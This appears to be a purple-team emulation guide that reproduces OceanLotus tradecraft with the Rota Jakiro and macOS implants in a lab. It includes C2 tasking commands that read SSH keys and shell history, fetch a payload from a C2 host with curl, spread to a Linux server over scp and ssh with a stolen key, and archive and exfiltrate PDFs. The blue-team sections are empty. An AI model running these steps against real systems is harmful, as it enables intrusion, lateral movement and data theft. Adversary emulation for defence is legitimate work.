# 🌊💮 Emulation 
This scenario emulates OceanLotus TTPs based primarily on two malware specimens either 
used by or associated with the OceanLotus actors:

1. Rota Jakiro
1. OceanLotus.abcdef


### 🗺️ Legend
This document is intended to be used as a operational guide for a purple team operation. 

Based on the CTI Emulation Plan, each step includes the following information:
- :microphone: **Voice Track** - Summuary of actions that are completed in this step
- :biohazard: **Procedures** - Red team operator instructions & commands to execute with expected output
- 🔮 **Source Code & Intelligence** - A table with links to the source code for specific actions with cited intelligence leveraged for this action (if available)
- 🔍 **Blue Team Notes** - key API calls, events, or telemtry for blue teams

In-line Symbols:
* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something


---
## Step 0 - Setup

### 📖 Voice Track
- Login to the AWS env - macOS
- Tests & make sure everthing is this
- Intro to story, background, naming, & context

Assume download of conkylan.app (unicorn in Vietnamese) resides on the downloads folder. 

---

### :biohazard: Procedures
- Login to the AWS env - macOS
- Tests & make sure everthing is this
- Intro to story, background, naming, & context

## Step 1 - Initial Compromise and Persistence
### :microphone: Voice Track
Assume download of conkylan.app (unicorn in Vietnamese) resides on the downloads folder. 

---
### :biohazard: Procedures
- Double click the conkylan.app
Confirm C2 Registration of the OSX implant 
### 🔮 Source Code & Intelligence
<br>

### 🔍 Blue Team Notes
<br>

## Step 2 - Discovery on macOS
### :microphone: Voice Track
Discovery on MacOS host:
ssh keys
known hosts
history

---
### :biohazard: Procedures

Confirm an SSH key is in /.ssh folder
```zsh
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/.ssh/"}'
```
 
Exfil Known Host file
```zsh
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_upload_file", "arg":"/Users/hpotter/.ssh/known_hosts"}'
 ```

Look for SCP commands in history file - print out
```zsh
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"cat /Users/hpotter/.bash_history"}'
```

Expected output: 
```
```

### 🔮 Source Code & Intelligence
<br>

### 🔍 Blue Team Notes
<br>

## Step 3 - Deploy Rota Jakiro
### :microphone: Voice Track
Identified the macOS connects to a Linux file server. 
 
Download Rota Jakiro and scp Rota Jakiro to the Linux server
 
Execute Rota Jakiro

---
### :biohazard: Procedures
Task OceanLotus to download Rota Jakiro to the macOS Host
```
./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"rota"}'
```

Veify the file downloaded
```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
```

>If that doesn't work do the following...
>  On the C2 server:
>  ```
>  cd /opt/oceanlotus/Resources/payloads
>  python3 -m http.server
>  ```
>  Task the implant
>  ```
>  ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
>  ```
>  
>  Veify the file downloaded
>  ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
>  ```

Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
```
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tm
p/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
```

Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
```
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup ./rota&2>/dev/null; sleep 3; pkill rota; rm nohup.out;\""}'
```

Confirm C2 Registration of Rota on the C2 Server

### 🔮 Source Code & Intelligence
<br>

### 🔍 Blue Team Notes
<br>


## Step 4 - Discovery on Linux Host
### :microphone: Voice Track
Discover on Linux Host: 
Upload device info

---
### :biohazard: Procedures
`./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup ./rota&2>/dev/null; sleep 3; pkill rota; rm nohup.out;\""}'`

Confirm device info is printed out

### 🔮 Source Code & Intelligence
<br>

### 🔍 Blue Team Notes
<br>


## Step 5 - Collection
### :microphone: Voice Track
Execute a shared object that includes: 
create tmp.rota folder 
move everything into the folder that is a .pdf extension 
tar all the .pdfs in the folder (exilf.tar.gz)
Confirm files were created

---
### :biohazard: Procedures
Execute:

run file query command, ensure files & folder exist 
Confirm: 
`./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_query_file", "arg": "/tmp/.rota/exfil.tar.gz"}'`

### 🔮 Source Code & Intelligence
<br>

### 🔍 Blue Team Notes
<br>


## Step 6 - Exfil from Linux Host
### :microphone: Voice Track
Execute another shared object that includes: 
Uploading the tar file from the folder

---
### :biohazard: Procedures
`./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_upload_file", "payload": "payload.so"}'`
Confirm upload of file to server 

### 🔮 Source Code & Intelligence
<br>

### 🔍 Blue Team Notes
<br>


:red_circle: End of Scenario. 
